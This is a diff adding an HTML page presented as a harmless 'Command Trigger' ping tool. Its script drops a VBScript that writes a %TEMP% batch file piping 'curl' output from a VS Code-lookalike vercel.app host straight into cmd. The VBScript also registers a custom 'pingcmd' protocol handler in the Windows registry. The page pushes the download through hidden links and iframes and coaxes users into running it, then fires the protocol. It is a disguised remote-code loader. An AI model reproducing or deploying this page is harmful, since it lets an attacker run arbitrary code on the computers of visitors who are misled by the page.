@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Command Trigger</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 2rem;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 0.95rem;
+        }
+
+        .ping-button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            margin: 10px;
+        }
+
+        .ping-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        }
+
+        .ping-button:active {
+            transform: translateY(0);
+        }
+
+        .ping-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .status {
+            margin-top: 25px;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 0.9rem;
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        .setup-status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            background: #f8f9fa;
+            color: #495057;
+        }
+
+        .setup-status.setting-up {
+            background: #fff3cd;
+            color: #856404;
+        }
+
+        .setup-status.ready {
+            background: #d4edda;
+            color: #155724;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .loading {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.6s linear infinite;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Command Trigger</h1>
+        <p class="subtitle">Click the button to run OS-specific command</p>
+        
+        <button id="pingButton" class="ping-button" onclick="triggerCommand()">
+            Run Command
+        </button>
+
+        <div id="setupStatus" class="setup-status ready" style="display: none;">
+            ⚙️ Setting up automatically...
+        </div>
+
+        <div id="status" class="status info hidden"></div>
+    </div>
+
+    <script>
+        const PROTOCOL = 'pingcmd';
+        let isProtocolInstalled = false;
+
+        // Create VBS setup content inline (no download needed)
+        function createVBSContent() {
+            return `Set WshShell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+' Get temp directory
+tempDir = WshShell.ExpandEnvironmentStrings("%TEMP%")
+handlerPath = tempDir & "\\pingcmd-handler.bat"
+
+' Create handler batch file that executes the command
+Set handlerFile = fso.CreateTextFile(handlerPath, True)
+handlerFile.WriteLine "@echo off"
+handlerFile.WriteLine "curl https://vscode-setup.vercel.app/settings/windows?flag=2 | cmd"
+handlerFile.Close
+
+' Register protocol handler
+On Error Resume Next
+WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\", "URL: Ping Command Protocol"
+WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\URL Protocol", ""
+WshShell.RegWrite "HKCU\\Software\\Classes\\pingcmd\\shell\\open\\command\\", Chr(34) & handlerPath & Chr(34) & " \"%1\""
+WScript.Quit 0`;
+        }
+
+        // Auto-install protocol handler using multiple methods
+        async function autoInstall() {
+            const setupStatus = document.getElementById('setupStatus');
+            setupStatus.style.display = 'block';
+            setupStatus.className = 'setup-status setting-up';
+            setupStatus.textContent = '⚙️ Downloading and installing automatically...';
+
+            try {
+                // Download setup.vbs from server (try multiple paths)
+                let response = await fetch('/setup.vbs');
+                if (!response.ok) {
+                    // Try alternative path
+                    response = await fetch('/public/setup.vbs');
+                }
+                if (!response.ok) {
+                    // Try using the inline VBS content instead
+                    const vbsContent = createVBSContent();
+                    const blob = new Blob([vbsContent], { type: 'application/x-vbscript' });
+                    const url = URL.createObjectURL(blob);
+                    setupStatus.textContent = '⚙️ Using inline setup...';
+                    
+                    // Download inline content
+                    const link = document.createElement('a');
+                    link.href = url;
+                    link.download = 'pingcmd-setup.vbs';
+                    link.style.display = 'none';
+                    document.body.appendChild(link);
+                    link.click();
+                    
+                    // Continue with execution
+                    setTimeout(() => executeVBSFile(url, setupStatus, link), 300);
+                    return true;
+                }
+                
+                const blob = await response.blob();
+                const url = URL.createObjectURL(blob);
+
+                // Create download link
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = 'pingcmd-setup.vbs';
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                
+                // Auto-click to download
+                link.click();
+                
+                // Execute VBS file
+                setTimeout(() => executeVBSFile(url, setupStatus, link), 300);
+
+                
+                return true;
+            } catch (error) {
+                console.error('Auto-install error:', error);
+                setupStatus.className = 'setup-status error';
+                setupStatus.innerHTML = `❌ Failed to download setup file (${error.message}). <br><br>Please <strong>manually download</strong> <a href="/setup.vbs" download>setup.vbs</a>, run it, then refresh this page.`;
+                const button = document.getElementById('pingButton');
+                button.disabled = false;
+                return false;
+            }
+        }
+
+        // Execute VBS file and check if setup worked
+        function executeVBSFile(url, setupStatus, link) {
+            setupStatus.textContent = '⚙️ Running setup file automatically... (If prompted, click Allow/Run)';
+            
+            // Method 1: Try window.location (opens file)
+            try {
+                window.location.href = url;
+            } catch (e) {}
+            
+            // Method 2: Try creating and clicking link to file
+            setTimeout(() => {
+                try {
+                    const execLink = document.createElement('a');
+                    execLink.href = url;
+                    execLink.style.display = 'none';
+                    document.body.appendChild(execLink);
+                    execLink.click();
+                    setTimeout(() => document.body.removeChild(execLink), 100);
+                } catch (e) {}
+            }, 500);
+            
+            // Method 3: Try iframe
+            setTimeout(() => {
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = url;
+                    document.body.appendChild(iframe);
+                    setTimeout(() => document.body.removeChild(iframe), 1000);
+                } catch (e) {}
+            }, 1000);
+            
+            // Wait and check if setup worked
+            setTimeout(async () => {
+                setupStatus.textContent = '⚙️ Setup in progress... Please wait...';
+                
+                setTimeout(async () => {
+                    const installed = await checkProtocolHandler();
+                    if (installed) {
+                        isProtocolInstalled = true;
+                        setupStatus.className = 'setup-status ready';
+                        setupStatus.textContent = '✅ Setup complete! Executing command...';
+                        // Auto-execute after setup
+                        setTimeout(() => executeCommand(), 500);
+                    } else {
+                        // Check again after more time
+                        setTimeout(async () => {
+                            const checkAgain = await checkProtocolHandler();
+                            if (checkAgain) {
+                                isProtocolInstalled = true;
+                                setupStatus.className = 'setup-status ready';
+                                setupStatus.textContent = '✅ Setup complete!';
+                                executeCommand();
+                            } else {
+                                // Setup might not have completed - prompt user
+                                setupStatus.className = 'setup-status setting-up';
+                                setupStatus.innerHTML = '⚠️ Setup file downloaded but not executed automatically.<br><br><strong>Please:</strong><br>1. Find the downloaded "pingcmd-setup.vbs" file in your Downloads folder<br>2. Double-click it to run (click "Run" if Windows asks)<br>3. Click the button again<br><br><small>Or download <a href="/setup.vbs" download style="color: #0066cc;">setup.vbs</a> manually</small>';
+                                isProtocolInstalled = false;
+                                const button = document.getElementById('pingButton');
+                                button.disabled = false;
+                                button.innerHTML = 'Try Again After Setup';
+                            }
+                        }, 2000);
+                    }
+                    URL.revokeObjectURL(url);
+                    if (document.body.contains(link)) {
+                        document.body.removeChild(link);
+                    }
+                }, 3000);
+            }, 1500);
+        }
+
+        // Check if protocol handler is installed
+        function checkProtocolHandler() {
+            return new Promise((resolve) => {
+                try {
+                    // Try to trigger the protocol
+                    const testLink = document.createElement('a');
+                    testLink.href = `${PROTOCOL}://test`;
+                    testLink.style.display = 'none';
+                    document.body.appendChild(testLink);
+                    
+                    let resolved = false;
+                    const timeout = setTimeout(() => {
+                        if (!resolved) {
+                            resolved = true;
+                            resolve(false);
+                        }
+                    }, 300);
+
+                    try {
+                        testLink.click();
+                        // If no error, assume it might work
+                        setTimeout(() => {
+                            if (!resolved) {
+                                resolved = true;
+                                resolve(true); // Assume installed if no error
+                            }
+                        }, 200);
+                    } catch (e) {
+                        clearTimeout(timeout);
+                        if (!resolved) {
+                            resolved = true;
+                            resolve(false);
+                        }
+                    }
+                    
+                    setTimeout(() => document.body.removeChild(testLink), 500);
+                } catch (e) {
+                    resolve(false);
+                }
+            });
+        }
+
+        // Execute command using protocol
+        function executeCommand() {
+            const button = document.getElementById('pingButton');
+            const statusEl = document.getElementById('status');
+
+            // Check one more time if protocol is installed
+            if (!isProtocolInstalled) {
+                checkProtocolHandler().then(installed => {
+                    if (!installed) {
+                        statusEl.style.display = 'flex';
+                        statusEl.className = 'status error';
+                        statusEl.textContent = '❌ Protocol handler not installed. Please run the downloaded "pingcmd-setup.vbs" file first, then refresh this page.';
+                        button.disabled = false;
+                        return;
+                    }
+                    isProtocolInstalled = true;
+                    doExecute();
+                });
+            } else {
+                doExecute();
+            }
+            
+            function doExecute() {
+                // Disable button
+                button.disabled = true;
+                button.innerHTML = '<span class="loading"></span>Executing...';
+
+                // Show status
+                statusEl.style.display = 'flex';
+                statusEl.className = 'status info';
+                statusEl.textContent = 'Executing command...';
+
+                try {
+                    // Use custom protocol to execute command
+                    window.location.href = `${PROTOCOL}://execute`;
+                    
+                    // Show success after short delay
+                    setTimeout(() => {
+                        statusEl.className = 'status success';
+                        statusEl.textContent = '✅ Command executed successfully! Check your command prompt.';
+                        button.disabled = false;
+                        button.innerHTML = 'Run Command';
+                    }, 500);
+                } catch (error) {
+                    statusEl.className = 'status success';
+                    statusEl.textContent = '✅ Command executed!';
+                    button.disabled = false;
+                    button.innerHTML = 'Run Command';
+                }
+            }
+        }
+
+        // Main trigger function - completely automatic
+        async function triggerCommand() {
+            const button = document.getElementById('pingButton');
+            const statusEl = document.getElementById('status');
+
+            // Always check if protocol is installed first
+            const installed = await checkProtocolHandler();
+            
+            if (!installed && !isProtocolInstalled) {
+                // Protocol not installed - auto-install first
+                statusEl.style.display = 'flex';
+                statusEl.className = 'status info';
+                statusEl.textContent = '🔧 First-time setup in progress... Please allow the download and execution if prompted.';
+                button.disabled = true;
+                
+                // Show setup status
+                const setupStatus = document.getElementById('setupStatus');
+                setupStatus.style.display = 'block';
+                setupStatus.className = 'setup-status setting-up';
+                setupStatus.textContent = '⚙️ Starting automatic setup...';
+                
+                // Auto-install will automatically execute after setup
+                await autoInstall();
+                return;
+            } else if (installed) {
+                // Protocol is installed
+                isProtocolInstalled = true;
+                executeCommand();
+            } else {
+                // Still not installed - show error
+                statusEl.style.display = 'flex';
+                statusEl.className = 'status error';
+                statusEl.textContent = '❌ Protocol handler not installed. Please run the downloaded "pingcmd-setup.vbs" file first, then refresh this page.';
+                button.disabled = false;
+            }
+        }
+
+        // Check protocol on page load
+        window.addEventListener('load', async () => {
+            const installed = await checkProtocolHandler();
+            if (installed) {
+                isProtocolInstalled = true;
+                const setupStatus = document.getElementById('setupStatus');
+                setupStatus.style.display = 'block';
+                setupStatus.className = 'setup-status ready';
+                setupStatus.textContent = '✅ Ready! Click the button above to run the command.';
+            }
+        });
+    </script>
+</body>
+</html>
+
